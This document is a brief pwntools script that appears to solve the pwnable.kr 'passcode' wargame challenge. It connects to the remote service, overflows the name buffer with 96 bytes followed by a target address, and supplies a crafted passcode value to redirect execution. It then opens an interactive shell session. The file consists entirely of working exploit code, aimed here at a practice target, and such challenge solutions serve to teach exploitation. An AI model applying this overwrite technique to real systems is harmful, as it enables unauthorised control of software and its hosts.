from pwn import *

p = remote('pwnable.kr',10004)

p.sendlineafter(b'enter you name :', b'A'*96+p32(0x804c014))
p.sendlineafter(b'enter passcode1 :', b'134517406')

p.interactive()